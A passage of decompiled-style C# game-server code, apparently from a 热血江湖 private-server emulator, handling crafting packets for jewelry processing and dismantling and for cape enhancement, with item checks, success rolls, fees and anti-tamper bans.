							HcItimesClass value35 = hcItimesClass56;
							装备栏包裹[num30].锁定 = true;
							合成物品表.TryAdd(1, value35);
						}
					}
					break;
				}
				case 202:
					if (base.当前操作类型 != 148 || (合成物品表.ContainsKey(2) ? true : false))
					{
						break;
					}
					if (合成物品表.ContainsKey(1))
					{
						HcItimesClass hcItimesClass148 = 合成物品表[1];
						if (World.Itme.TryGetValue(BitConverter.ToInt32(hcItimesClass148.物品id, 0), out var value43))
						{
							if (value43.FLD_LEVEL >= 130)
							{
								if (BitConverter.ToInt32(装备栏包裹[num30].物品ID, 0) != 1000000640)
								{
									合成提示(num, 7, 0, 装备栏包裹[num30]);
									break;
								}
								if (BitConverter.ToInt32(装备栏包裹[num30].物品数量, 0) < 4)
								{
									合成提示(num, 8, 0, 装备栏包裹[num30]);
									break;
								}
								合成提示(num, 1, 0, 装备栏包裹[num30]);
								合成提示(num, 1, 0, 装备栏包裹[num30]);
								合成提示(num, 1, 0, 装备栏包裹[num30]);
								合成提示(num, 1, 0, 装备栏包裹[num30]);
								HcItimesClass hcItimesClass49 = new HcItimesClass();
								hcItimesClass49.位置 = num30;
								hcItimesClass49.物品 = 装备栏包裹[num30].物品_byte;
								HcItimesClass value44 = hcItimesClass49;
								装备栏包裹[num30].锁定 = true;
								if (!合成物品表.ContainsKey(2))
								{
									合成物品表.TryAdd(2, value44);
								}
							}
							else if (value43.FLD_LEVEL >= 100)
							{
								if (BitConverter.ToInt32(装备栏包裹[num30].物品ID, 0) != 1000000640)
								{
									合成提示(num, 7, 0, 装备栏包裹[num30]);
									break;
								}
								if (BitConverter.ToInt32(装备栏包裹[num30].物品数量, 0) < 3)
								{
									合成提示(num, 8, 0, 装备栏包裹[num30]);
									break;
								}
								合成提示(num, 1, 0, 装备栏包裹[num30]);
								合成提示(num, 1, 0, 装备栏包裹[num30]);
								合成提示(num, 1, 0, 装备栏包裹[num30]);
								HcItimesClass hcItimesClass50 = new HcItimesClass();
								hcItimesClass50.位置 = num30;
								hcItimesClass50.物品 = 装备栏包裹[num30].物品_byte;
								HcItimesClass value45 = hcItimesClass50;
								装备栏包裹[num30].锁定 = true;
								if (!合成物品表.ContainsKey(2))
								{
									合成物品表.TryAdd(2, value45);
								}
							}
							else
							{
								if (value43.FLD_LEVEL < 60)
								{
									break;
								}
								if (BitConverter.ToInt32(装备栏包裹[num30].物品ID, 0) != 1000000640)
								{
									合成提示(num, 7, 0, 装备栏包裹[num30]);
									break;
								}
								if (BitConverter.ToInt32(装备栏包裹[num30].物品数量, 0) < 2)
								{
									合成提示(num, 8, 0, 装备栏包裹[num30]);
									break;
								}
								合成提示(num, 1, 0, 装备栏包裹[num30]);
								合成提示(num, 1, 0, 装备栏包裹[num30]);
								HcItimesClass hcItimesClass51 = new HcItimesClass();
								hcItimesClass51.位置 = num30;
								hcItimesClass51.物品 = 装备栏包裹[num30].物品_byte;
								HcItimesClass value47 = hcItimesClass51;
								装备栏包裹[num30].锁定 = true;
								if (!合成物品表.ContainsKey(2))
								{
									合成物品表.TryAdd(2, value47);
								}
							}
						}
						else
						{
							合成提示(num, 7, 0, 装备栏包裹[num30]);
						}
					}
					else
					{
						合成提示(num, 5, 0, 装备栏包裹[num30]);
					}
					break;
				case 203:
					if (base.当前操作类型 != 148 || (合成物品表.ContainsKey(3) ? true : false))
					{
						break;
					}
					if (合成物品表.ContainsKey(1))
					{
						HcItimesClass hcItimesClass129 = 合成物品表[1];
						if (World.Itme.TryGetValue(BitConverter.ToInt32(hcItimesClass129.物品id, 0), out var value11))
						{
							if (value11.FLD_RESIDE2 == 7)
							{
								if (value11.FLD_LEVEL >= 130)
								{
									if (BitConverter.ToInt32(装备栏包裹[num30].物品ID, 0) != 1000000638 && BitConverter.ToInt32(装备栏包裹[num30].物品ID, 0) != 1008000453)
									{
										合成提示(num, 7, 0, 装备栏包裹[num30]);
										break;
									}
									if (BitConverter.ToInt32(装备栏包裹[num30].物品数量, 0) < 4)
									{
										合成提示(num, 8, 0, 装备栏包裹[num30]);
										break;
									}
									合成提示(num, 1, 0, 装备栏包裹[num30]);
									合成提示(num, 1, 0, 装备栏包裹[num30]);
									合成提示(num, 1, 0, 装备栏包裹[num30]);
									合成提示(num, 1, 0, 装备栏包裹[num30]);
									HcItimesClass hcItimesClass40 = new HcItimesClass();
									hcItimesClass40.位置 = num30;
									hcItimesClass40.物品 = 装备栏包裹[num30].物品_byte;
									HcItimesClass value12 = hcItimesClass40;
									装备栏包裹[num30].锁定 = true;
									if (!合成物品表.ContainsKey(3))
									{
										合成物品表.TryAdd(3, value12);
									}
									break;
								}
								if (value11.FLD_LEVEL >= 100)
								{
									if (BitConverter.ToInt32(装备栏包裹[num30].物品ID, 0) != 1000000638 && BitConverter.ToInt32(装备栏包裹[num30].物品ID, 0) != 1008000453)
									{
										合成提示(num, 7, 0, 装备栏包裹[num30]);
										break;
									}
									if (BitConverter.ToInt32(装备栏包裹[num30].物品数量, 0) < 2)
									{
										合成提示(num, 8, 0, 装备栏包裹[num30]);
										break;
									}
									合成提示(num, 1, 0, 装备栏包裹[num30]);
									合成提示(num, 1, 0, 装备栏包裹[num30]);
									HcItimesClass hcItimesClass41 = new HcItimesClass();
									hcItimesClass41.位置 = num30;
									hcItimesClass41.物品 = 装备栏包裹[num30].物品_byte;
									HcItimesClass value14 = hcItimesClass41;
									装备栏包裹[num30].锁定 = true;
									if (!合成物品表.ContainsKey(3))
									{
										合成物品表.TryAdd(3, value14);
									}
									break;
								}
								if (value11.FLD_LEVEL >= 60)
								{
									if (BitConverter.ToInt32(装备栏包裹[num30].物品ID, 0) != 1000000638 && BitConverter.ToInt32(装备栏包裹[num30].物品ID, 0) != 1008000453)
									{
										合成提示(num, 7, 0, 装备栏包裹[num30]);
										break;
									}
									if (BitConverter.ToInt32(装备栏包裹[num30].物品数量, 0) < 1)
									{
										合成提示(num, 8, 0, 装备栏包裹[num30]);
										break;
									}
									合成提示(num, 1, 0, 装备栏包裹[num30]);
									HcItimesClass hcItimesClass42 = new HcItimesClass();
									hcItimesClass42.位置 = num30;
									hcItimesClass42.物品 = 装备栏包裹[num30].物品_byte;
									HcItimesClass value15 = hcItimesClass42;
									装备栏包裹[num30].锁定 = true;
									if (!合成物品表.ContainsKey(3))
									{
										合成物品表.TryAdd(3, value15);
									}
									break;
								}
							}
							else if (value11.FLD_RESIDE2 == 8)
							{
								if (value11.FLD_LEVEL >= 130)
								{
									if (BitConverter.ToInt32(装备栏包裹[num30].物品ID, 0) != 1000000637 && BitConverter.ToInt32(装备栏包裹[num30].物品ID, 0) != 1008000452)
									{
										合成提示(num, 7, 0, 装备栏包裹[num30]);
										break;
									}
									if (BitConverter.ToInt32(装备栏包裹[num30].物品数量, 0) < 4)
									{
										合成提示(num, 8, 0, 装备栏包裹[num30]);
										break;
									}
									合成提示(num, 1, 0, 装备栏包裹[num30]);
									合成提示(num, 1, 0, 装备栏包裹[num30]);
									合成提示(num, 1, 0, 装备栏包裹[num30]);
									合成提示(num, 1, 0, 装备栏包裹[num30]);
									HcItimesClass hcItimesClass43 = new HcItimesClass();
									hcItimesClass43.位置 = num30;
									hcItimesClass43.物品 = 装备栏包裹[num30].物品_byte;
									HcItimesClass value16 = hcItimesClass43;
									装备栏包裹[num30].锁定 = true;
									if (!合成物品表.ContainsKey(3))
									{
										合成物品表.TryAdd(3, value16);
									}
									break;
								}
								if (value11.FLD_LEVEL >= 100)
								{
									if (BitConverter.ToInt32(装备栏包裹[num30].物品ID, 0) != 1000000637 && BitConverter.ToInt32(装备栏包裹[num30].物品ID, 0) != 1008000452)
									{
										合成提示(num, 7, 0, 装备栏包裹[num30]);
										break;
									}
									if (BitConverter.ToInt32(装备栏包裹[num30].物品数量, 0) < 2)
									{
										合成提示(num, 8, 0, 装备栏包裹[num30]);
										break;
									}
									合成提示(num, 1, 0, 装备栏包裹[num30]);
									合成提示(num, 1, 0, 装备栏包裹[num30]);
									HcItimesClass hcItimesClass44 = new HcItimesClass();
									hcItimesClass44.位置 = num30;
									hcItimesClass44.物品 = 装备栏包裹[num30].物品_byte;
									HcItimesClass value17 = hcItimesClass44;
									装备栏包裹[num30].锁定 = true;
									if (!合成物品表.ContainsKey(3))
									{
										合成物品表.TryAdd(3, value17);
									}
									break;
								}
								if (value11.FLD_LEVEL >= 60)
								{
									if (BitConverter.ToInt32(装备栏包裹[num30].物品ID, 0) != 1000000637 && BitConverter.ToInt32(装备栏包裹[num30].物品ID, 0) != 1008000452)
									{
										合成提示(num, 7, 0, 装备栏包裹[num30]);
										break;
									}
									if (BitConverter.ToInt32(装备栏包裹[num30].物品数量, 0) < 1)
									{
										合成提示(num, 8, 0, 装备栏包裹[num30]);
										break;
									}
									合成提示(num, 1, 0, 装备栏包裹[num30]);
									HcItimesClass hcItimesClass45 = new HcItimesClass();
									hcItimesClass45.位置 = num30;
									hcItimesClass45.物品 = 装备栏包裹[num30].物品_byte;
									HcItimesClass value18 = hcItimesClass45;
									装备栏包裹[num30].锁定 = true;
									if (!合成物品表.ContainsKey(3))
									{
										合成物品表.TryAdd(3, value18);
									}
									break;
								}
							}
							else if (value11.FLD_RESIDE2 == 10)
							{
								if (value11.FLD_LEVEL >= 130)
								{
									if (BitConverter.ToInt32(装备栏包裹[num30].物品ID, 0) != 1000000639 && BitConverter.ToInt32(装备栏包裹[num30].物品ID, 0) != 1008000454)
									{
										合成提示(num, 7, 0, 装备栏包裹[num30]);
										break;
									}
									if (BitConverter.ToInt32(装备栏包裹[num30].物品数量, 0) < 4)
									{
										合成提示(num, 8, 0, 装备栏包裹[num30]);
										break;
									}
									合成提示(num, 1, 0, 装备栏包裹[num30]);
									合成提示(num, 1, 0, 装备栏包裹[num30]);
									合成提示(num, 1, 0, 装备栏包裹[num30]);
									合成提示(num, 1, 0, 装备栏包裹[num30]);
									HcItimesClass hcItimesClass46 = new HcItimesClass();
									hcItimesClass46.位置 = num30;
									hcItimesClass46.物品 = 装备栏包裹[num30].物品_byte;
									HcItimesClass value19 = hcItimesClass46;
									装备栏包裹[num30].锁定 = true;
									if (!合成物品表.ContainsKey(3))
									{
										合成物品表.TryAdd(3, value19);
									}
									break;
								}
								if (value11.FLD_LEVEL >= 100)
								{
									if (BitConverter.ToInt32(装备栏包裹[num30].物品ID, 0) != 1000000639 && BitConverter.ToInt32(装备栏包裹[num30].物品ID, 0) != 1008000454)
									{
										合成提示(num, 7, 0, 装备栏包裹[num30]);
										break;
									}
									if (BitConverter.ToInt32(装备栏包裹[num30].物品数量, 0) < 2)
									{
										合成提示(num, 8, 0, 装备栏包裹[num30]);
										break;
									}
									合成提示(num, 1, 0, 装备栏包裹[num30]);
									合成提示(num, 1, 0, 装备栏包裹[num30]);
									HcItimesClass hcItimesClass47 = new HcItimesClass();
									hcItimesClass47.位置 = num30;
									hcItimesClass47.物品 = 装备栏包裹[num30].物品_byte;
									HcItimesClass value20 = hcItimesClass47;
									装备栏包裹[num30].锁定 = true;
									if (!合成物品表.ContainsKey(3))
									{
										合成物品表.TryAdd(3, value20);
									}
									break;
								}
								if (value11.FLD_LEVEL >= 60)
								{
									if (BitConverter.ToInt32(装备栏包裹[num30].物品ID, 0) != 1000000639 && BitConverter.ToInt32(装备栏包裹[num30].物品ID, 0) != 1008000454)
									{
										合成提示(num, 7, 0, 装备栏包裹[num30]);
										break;
									}
									if (BitConverter.ToInt32(装备栏包裹[num30].物品数量, 0) < 1)
									{
										合成提示(num, 8, 0, 装备栏包裹[num30]);
										break;
									}
									合成提示(num, 1, 0, 装备栏包裹[num30]);
									HcItimesClass hcItimesClass48 = new HcItimesClass();
									hcItimesClass48.位置 = num30;
									hcItimesClass48.物品 = 装备栏包裹[num30].物品_byte;
									HcItimesClass value21 = hcItimesClass48;
									装备栏包裹[num30].锁定 = true;
									if (!合成物品表.ContainsKey(3))
									{
										合成物品表.TryAdd(3, value21);
									}
									break;
								}
							}
						}
						合成提示(num, 7, 0, 装备栏包裹[num30]);
					}
					else
					{
						合成提示(num, 5, 0, 装备栏包裹[num30]);
					}
					break;
				case 204:
					if (base.当前操作类型 != 148 || (合成物品表.ContainsKey(4) ? true : false))
					{
						break;
					}
					if (BitConverter.ToInt32(装备栏包裹[num30].物品ID, 0) != 1008000072 && ((BitConverter.ToInt32(装备栏包裹[num30].物品ID, 0) != 1000000619) ? true : false))
					{
						合成提示(num, 7, 0, 装备栏包裹[num30]);
					}
					else if (合成物品表.ContainsKey(1))
					{
						HcItimesClass hcItimesClass115 = 合成物品表[1];
						hcItimesClass115.得到属性();
						hcItimesClass115.强化属性阶段();
						if (BitConverter.ToInt32(装备栏包裹[num30].物品ID, 0) == 1000000619 && ((hcItimesClass115.强化数量 > 2) ? true : false))
						{
							合成提示(num, 7, 0, 装备栏包裹[num30]);
							break;
						}
						HcItimesClass hcItimesClass39 = new HcItimesClass();
						hcItimesClass39.位置 = num30;
						hcItimesClass39.物品 = 装备栏包裹[num30].物品_byte;
						HcItimesClass value170 = hcItimesClass39;
						装备栏包裹[num30].锁定 = true;
						if (!合成物品表.ContainsKey(4))
						{
							合成物品表.TryAdd(4, value170);
						}
						合成提示(num, 1, 0, 装备栏包裹[num30]);
					}
					else
					{
						合成提示(num, 5, 0, 装备栏包裹[num30]);
					}
					break;
				case 205:
					try
					{
						if (合成物品表.TryGetValue(1, out var value171))
						{
							装备栏包裹[value171.位置].锁定 = false;
							合成物品表.Clear();
							合成系统解锁();
						}
						元宝合成开关 = 0;
						合成提示(num, 1, 0, 装备栏包裹[num30]);
					}
					catch (Exception ex81)
					{
						元宝合成开关 = 0;
						MainForm.WriteLine(1, "合成系统 首饰加工 205 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex81.Message);
					}
					break;
				case 206:
					try
					{
						if (base.当前操作类型 != 149 || 合成物品表.ContainsKey(1))
						{
							break;
						}
						ItmeClass value159;
						if (装备栏包裹[num30].物品绑定)
						{
							合成提示(num, 2, 0, 装备栏包裹[num30]);
						}
						else if (World.Itme.TryGetValue(BitConverter.ToInt32(装备栏包裹[num30].物品ID, 0), out value159))
						{
							if (value159.FLD_RESIDE2 != 7 && value159.FLD_RESIDE2 != 8 && value159.FLD_RESIDE2 != 10)
							{
								合成提示(num, 0, 0, 装备栏包裹[num30]);
								break;
							}
							if (value159.FLD_LEVEL < 60)
							{
								合成提示(num, 0, 0, 装备栏包裹[num30]);
								break;
							}
							HcItimesClass hcItimesClass38 = new HcItimesClass();
							hcItimesClass38.位置 = num30;
							hcItimesClass38.物品 = 装备栏包裹[num30].物品_byte;
							HcItimesClass value160 = hcItimesClass38;
							装备栏包裹[num30].锁定 = true;
							合成物品表.TryAdd(1, value160);
							合成提示(num, 1, 0, 装备栏包裹[num30]);
						}
						else
						{
							合成提示(num, 0, 0, 装备栏包裹[num30]);
						}
					}
					catch (Exception ex75)
					{
						MainForm.WriteLine(1, "206首饰分解 出错" + base.Client.WorldId + "|" + base.Client.ToString() + " " + ex75);
					}
					break;
				case 207:
					try
					{
						if (base.当前操作类型 != 149 || 合成物品表.Count <= 0)
						{
							break;
						}
						if (合成物品表.ContainsKey(1))
						{
							HcItimesClass hcItimesClass107 = 合成物品表[1];
							if (!World.Itme.TryGetValue(BitConverter.ToInt32(hcItimesClass107.物品id, 0), out var value161) || (value161.FLD_RESIDE2 != 7 && value161.FLD_RESIDE2 != 8 && value161.FLD_RESIDE2 != 10))
							{
								break;
							}
							int value162 = 1;
							int value163 = 1000000640;
							int num72 = 0;
							int value164 = 0;
							if (得到包裹空位数() < 2)
							{
								合成提示(num, 8, 0, 装备栏包裹[num30]);
								break;
							}
							num72 = RNG.Next(1, 2);
							if (value161.FLD_LEVEL >= 100)
							{
								value162 = RNG.Next(1, 5);
							}
							else if (value161.FLD_LEVEL >= 80)
							{
								value162 = RNG.Next(1, 2);
							}
							else if (value161.FLD_LEVEL >= 60)
							{
								value162 = RNG.Next(1, 3);
							}
							if (value161.FLD_RESIDE2 == 7 || value161.FLD_RESIDE2 == 8 || value161.FLD_RESIDE2 == 10)
							{
								减去物品(hcItimesClass107.位置, 1);
								if (value161.FLD_RESIDE2 == 7)
								{
									value164 = 1000000638;
								}
								else if (value161.FLD_RESIDE2 == 8)
								{
									value164 = 1000000637;
								}
								else if (value161.FLD_RESIDE2 == 10)
								{
									value164 = 1000000639;
								}
								int num73 = 得到包裹空位(this);
								if (num73 != -1)
								{
									增加物品2(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(value163), num73, BitConverter.GetBytes(value162), new byte[56]);
									int num75 = 得到包裹空位(this);
									if (num75 != -1)
									{
										增加物品2(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(value164), num75, BitConverter.GetBytes(1), new byte[56]);
									}
									合成提示(num, 1, 0, 装备栏包裹[num30]);
									合成物品表.Clear();
									合成系统解锁();
									元宝合成开关 = 0;
								}
								else
								{
									合成提示(num, 8, 0, 装备栏包裹[num30]);
								}
							}
							else
							{
								封号(720, base.Userid, "首饰分解.非法修改封包封号");
							}
							break;
						}
						合成提示(num, 5, 0, 装备栏包裹[num30]);
					}
					catch (Exception ex77)
					{
						MainForm.WriteLine(1, "206首饰分解 出错" + base.Client.WorldId + "|" + base.Client.ToString() + " " + ex77);
					}
					break;
				case 208:
					try
					{
						if (合成物品表.TryGetValue(1, out var value155))
						{
							装备栏包裹[value155.位置].锁定 = false;
							合成物品表.Clear();
							合成系统解锁();
						}
						元宝合成开关 = 0;
						合成提示(num, 1, 0, 装备栏包裹[num30]);
					}
					catch (Exception ex72)
					{
						元宝合成开关 = 0;
						MainForm.WriteLine(1, "合成系统 首饰分解 208 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex72.Message);
					}
					break;
				case 210:
					try
					{
						if (合成物品表.TryGetValue(1, out var value153))
						{
							装备栏包裹[value153.位置].锁定 = false;
							合成提示(num, 1, 0, 装备栏包裹[value153.位置]);
							合成物品表.Clear();
							合成系统解锁();
							元宝合成开关 = 0;
						}
					}
					catch (Exception ex71)
					{
						元宝合成开关 = 0;
						MainForm.WriteLine(1, "合成系统 合成属性 合成4 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex71.Message);
					}
					break;
				case 211:
					try
					{
						if (!装备栏包裹[num30].锁定 && !装备栏包裹[num30].物品绑定 && (base.当前操作类型 == 179 || base.当前操作类型 == 180) && (base.当前操作类型 != 179 || 装备栏包裹[num30].FLD_MAGIC0 < 400000000 + World.披风强化最大数量) && (!World.Itme.TryGetValue(BitConverter.ToInt32(装备栏包裹[num30].物品ID, 0), out var value156) || value156.FLD_RESIDE2 == 12) && !合成物品表.ContainsKey(1))
						{
							HcItimesClass hcItimesClass37 = new HcItimesClass();
							hcItimesClass37.位置 = num30;
							hcItimesClass37.物品 = 装备栏包裹[num30].物品_byte;
							HcItimesClass value157 = hcItimesClass37;
							装备栏包裹[num30].锁定 = true;
							合成物品表.TryAdd(1, value157);
							合成提示(num, 1, 0, 装备栏包裹[num30]);
						}
					}
					catch (Exception ex73)
					{
						MainForm.WriteLine(1, "披风强化 放入披风 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex73.Message);
					}
					break;
				case 212:
					if (合成物品表.Count != 0 && 合成物品表.ContainsKey(1) && (装备栏包裹[num30].Get物品ID == 1000000545 || 装备栏包裹[num30].Get物品ID == 1000001168) && !合成物品表.ContainsKey(2))
					{
						装备栏包裹[num30].锁定 = true;
						合成物品表.TryAdd(2, new HcItimesClass
						{
							位置 = num30,
							物品 = 装备栏包裹[num30].物品_byte
						});
						合成提示(num, 1, 0, 装备栏包裹[num30]);
					}
					break;
				case 213:
					try
					{
						if (合成物品表.Count != 0 && !合成物品表.ContainsKey(3))
						{
							合成物品表.TryAdd(3, new HcItimesClass
							{
								位置 = num30,
								物品 = 装备栏包裹[num30].物品_byte
							});
							装备栏包裹[num30].锁定 = true;
							合成提示(num, 1, 0, 装备栏包裹[num30]);
						}
					}
					catch (Exception ex63)
					{
						MainForm.WriteLine(1, "合成系统 合成属性 合成3 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex63.Message);
					}
					break;
				case 214:
					try
					{
						if (base.当前操作类型 == 181 && !装备栏包裹[num30].锁定 && !装备栏包裹[num30].物品绑定)
						{
							ItmeClass value146;
							if (装备栏包裹[num30].FLD_MAGIC0 != 0 || 装备栏包裹[num30].FLD_MAGIC1 != 0 || 装备栏包裹[num30].FLD_MAGIC2 != 0 || 装备栏包裹[num30].FLD_MAGIC3 != 0 || ((装备栏包裹[num30].FLD_MAGIC4 != 0) ? true : false))
							{
								系统提示("请放置无强化无合成的白披风。");
							}
							else if (!合成物品表.ContainsKey(0) && (!World.Itme.TryGetValue(BitConverter.ToInt32(装备栏包裹[num30].物品ID, 0), out value146) || value146.FLD_RESIDE2 == 12))
							{
								HcItimesClass hcItimesClass36 = new HcItimesClass();
								hcItimesClass36.位置 = num30;
								hcItimesClass36.物品 = 装备栏包裹[num30].物品_byte;
								HcItimesClass value147 = hcItimesClass36;
								装备栏包裹[num30].锁定 = true;
								合成物品表.TryAdd(0, value147);
								合成提示(num, 1, 0, 装备栏包裹[num30]);
							}
						}
					}
					catch (Exception ex62)
					{
						MainForm.WriteLine(1, "合成系统 披风组合放披风 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex62.Message);
					}
					break;
				case 215:
					try
					{
						if (合成物品表.Count != 0 && !合成物品表.ContainsKey(1))
						{
							ItmeClass value144;
							if (装备栏包裹[num30].FLD_MAGIC0 == 0 && 装备栏包裹[num30].FLD_MAGIC1 == 0 && 装备栏包裹[num30].FLD_MAGIC2 == 0 && 装备栏包裹[num30].FLD_MAGIC3 == 0 && ((装备栏包裹[num30].FLD_MAGIC4 == 0) ? true : false))
							{
								系统提示("请放置已合成属性的披风。");
							}
							else if (!World.Itme.TryGetValue(BitConverter.ToInt32(装备栏包裹[num30].物品ID, 0), out value144) || value144.FLD_RESIDE2 == 12)
							{
								HcItimesClass hcItimesClass35 = new HcItimesClass();
								hcItimesClass35.位置 = num30;
								hcItimesClass35.物品 = 装备栏包裹[num30].物品_byte;
								HcItimesClass value145 = hcItimesClass35;
								装备栏包裹[num30].锁定 = true;
								合成物品表.TryAdd(1, value145);
								合成提示(num, 1, 0, 装备栏包裹[num30]);
							}
						}
					}
					catch (Exception ex61)
					{
						MainForm.WriteLine(1, "合成系统 披风组合放属性披风 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex61.Message);
					}
					break;
				case 216:
					try
					{
						if (!装备栏包裹[num30].锁定 && !装备栏包裹[num30].物品绑定 && (base.当前操作类型 == 179 || base.当前操作类型 == 180) && (base.当前操作类型 != 179 || 装备栏包裹[num30].FLD_MAGIC0 < 400000000 + World.披风强化最大数量) && (!World.Itme.TryGetValue(BitConverter.ToInt32(装备栏包裹[num30].物品ID, 0), out var value140) || value140.FLD_RESIDE2 == 12) && !合成物品表.ContainsKey(1))
						{
							HcItimesClass hcItimesClass34 = new HcItimesClass();
							hcItimesClass34.位置 = num30;
							hcItimesClass34.物品 = 装备栏包裹[num30].物品_byte;
							HcItimesClass value141 = hcItimesClass34;
							装备栏包裹[num30].锁定 = true;
							合成物品表.TryAdd(1, value141);
							合成提示(num, 1, 0, 装备栏包裹[num30]);
						}
					}
					catch (Exception ex59)
					{
						MainForm.WriteLine(1, "披风强化 放入披风 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex59.Message);
					}
					break;
				case 217:
				{
					if (base.当前操作类型 != 179 || 合成物品表.Count <= 0 || ((base.Player_Money < 500000) ? true : false))
					{
						break;
					}
					合成手续费 = 500000;
					base.Player_Money -= 合成手续费;
					HcItimesClass hcItimesClass108 = null;
					HcItimesClass hcItimesClass110 = null;
					HcItimesClass hcItimesClass111 = null;
					if (合成物品表.ContainsKey(1))
					{
						hcItimesClass108 = 合成物品表[1];
					}
					if (合成物品表.ContainsKey(2))
					{
						hcItimesClass110 = 合成物品表[2];
					}
					if (合成物品表.ContainsKey(3))
					{
						hcItimesClass111 = 合成物品表[3];
					}
					if (BitConverter.ToInt64(装备栏包裹[hcItimesClass108.位置].物品全局ID, 0) != BitConverter.ToInt64(hcItimesClass108.物品全局ID, 0) || hcItimesClass110 == null || (hcItimesClass110 != null && BitConverter.ToInt64(装备栏包裹[hcItimesClass110.位置].物品全局ID, 0) != BitConverter.ToInt64(hcItimesClass110.物品全局ID, 0)) || (hcItimesClass111 != null && ((BitConverter.ToInt64(装备栏包裹[hcItimesClass111.位置].物品全局ID, 0) != BitConverter.ToInt64(hcItimesClass111.物品全局ID, 0)) ? true : false)))
					{
						break;
					}
					hcItimesClass108.得到属性();
					hcItimesClass108.强化属性阶段();
					if (!World.Itme.TryGetValue(BitConverter.ToInt32(hcItimesClass108.物品id, 0), out var value166))
					{
						break;
					}
					if (value166.FLD_RESIDE2 != 12)
					{
						string[] array6 = new string[5] { "合成系统 披风强化 BUG1[", null, null, null, null };
						array6[1] = BitConverter.ToInt32(hcItimesClass108.物品id, 0).ToString();
						array6[2] = "]-[";
						array6[3] = BitConverter.ToInt32(hcItimesClass110.物品id, 0).ToString();
						array6[4] = "]";
						MainForm.WriteLine(6, string.Concat(array6));
						break;
					}
					if (装备栏包裹[hcItimesClass108.位置].物品绑定)
					{
						合成提示(num, 2, 0, 装备栏包裹[hcItimesClass108.位置]);
						break;
					}
					if (World.披风强化是否消耗元宝 == 1)
					{
						CheckTreasureGems();
						if ((long)base.FLD_RXPIONT < (long)World.披风强化消耗元宝数量)
						{
							合成提示(num, 4, 0, 装备栏包裹[hcItimesClass108.位置]);
							系统提示("您的元宝不足需要扣除" + World.披风强化消耗元宝数量 + "元宝, 才可以进行强化", 50, "");
							return;
						}
						检察元宝数据(World.披风强化消耗元宝数量, 0, "强化");
						SaveGemData();
					}
					double num76 = RNG.Next(20, 1000);
					double num77 = hcItimesClass108.强化数量 * 10;
					if (hcItimesClass108.强化数量 >= World.披风强化最大数量)
					{
						合成物品表.Clear();
						break;
					}
					if (hcItimesClass110 != null)
					{
						num76 += (double)灵宠披风取玉(BitConverter.ToInt32(hcItimesClass110.物品id, 0));
					}
					if (hcItimesClass111 != null)
					{
						num76 += (double)幸运符加成(BitConverter.ToInt32(hcItimesClass111.物品id, 0));
					}
					if (元宝合成开关 == 1)
					{
						num76 += 50.0;
					}
					if (base.FLD_VIP == 1)
					{
						num76 += 1000.0 * World.VIP合成率增加百分比;
					}
					if (World.披风强化率 != 0.0)
					{
						num76 += 1000.0 * World.披风强化率;
					}
					if (base.FLD_人物_追加_合成成功率百分比 != 0.0)
					{
						num76 += 1000.0 * base.FLD_人物_追加_合成成功率百分比;
					}
					if (base.FLD_装备_追加_合成成功率百分比 > 0.0)
					{
						num76 += 1000.0 * base.FLD_装备_追加_合成成功率百分比 / 2.0;
					}
					if (GM模式 == 8)
					{
						num77 = 0.0;
					}
					if (num76 >= num77)
					{
						hcItimesClass108.强化类型 = 4;
						hcItimesClass108.强化数量++;
						if (hcItimesClass108.强化数量 > World.披风强化最大数量)
						{
							hcItimesClass108.强化数量 = World.披风强化最大数量;
						}
						hcItimesClass108.设置阶段属性();
						if (hcItimesClass108.强化数量 >= int.Parse(World.强化数量大于发送快报[3]))
						{
							发送快报(base.UserName, hcItimesClass108.强化数量, hcItimesClass108.物品id, base.Player_Zx);
						}
						if (BitConverter.ToInt32(装备栏包裹[hcItimesClass108.位置].物品ID, 0) != 0 && ((BitConverter.ToInt64(装备栏包裹[hcItimesClass108.位置].物品全局ID, 0) == BitConverter.ToInt64(hcItimesClass108.物品全局ID, 0)) ? true : false))
						{
							减去物品(hcItimesClass108.位置, 1);
							增加物品(hcItimesClass108.物品全局ID, hcItimesClass108.物品id, hcItimesClass108.位置, hcItimesClass108.物品数量, hcItimesClass108.物品属性);
						}
						装备栏包裹[hcItimesClass108.位置].锁定 = false;
						RxjhClass.合成记录(base.Userid, base.UserName, value166.ItmeNAME, num, "披风强化", "成功", 装备栏包裹[hcItimesClass108.位置]);
						合成提示(num, 1, 合成手续费, 装备栏包裹[hcItimesClass108.位置]);
					}
					else
					{
						if (hcItimesClass108.强化数量 >= 4)
						{
							hcItimesClass108.强化类型 = 4;
							if (BitConverter.ToInt32(装备栏包裹[hcItimesClass110.位置].物品ID, 0) == 1000001168)
							{
								hcItimesClass108.强化数量 = hcItimesClass108.强化数量;
							}
							else
							{
								hcItimesClass108.强化数量 -= 3;
							}
							hcItimesClass108.设置阶段属性();
							if (BitConverter.ToInt32(装备栏包裹[hcItimesClass108.位置].物品ID, 0) != 0 && ((BitConverter.ToInt64(装备栏包裹[hcItimesClass108.位置].物品全局ID, 0) == BitConverter.ToInt64(hcItimesClass108.物品全局ID, 0)) ? true : false))
							{
								减去物品(hcItimesClass108.位置, 1);
								增加物品(hcItimesClass108.物品全局ID, hcItimesClass108.物品id, hcItimesClass108.位置, hcItimesClass108.物品数量, hcItimesClass108.物品属性);
							}
							装备栏包裹[hcItimesClass108.位置].锁定 = false;
						}
						RxjhClass.合成记录(base.Userid, base.UserName, value166.ItmeNAME, num, "披风强化", "失败", 装备栏包裹[hcItimesClass108.位置]);
						合成提示(num, 65513, 合成手续费, 装备栏包裹[hcItimesClass108.位置]);
					}
					更新金钱和负重();
					减去物品(hcItimesClass110.位置, 1);
					if (hcItimesClass111 != null)
					{
						减去物品(hcItimesClass111.位置, 1);
					}
					合成物品表.Clear();
					合成系统解锁();
					元宝合成开关 = 0;
					打开仓库中 = true;
					合成手续费 = 0;
					break;
				}
				case 218:
				{
					if (base.当前操作类型 != 180)
					{
						break;
					}
					int num50 = GetEmptyBagSlot();
					if (num50 == -1)
					{
						系统提示("背包没有空位了。");
					}
					else
					{
						if (合成物品表.Count == 0)
						{
							break;
						}
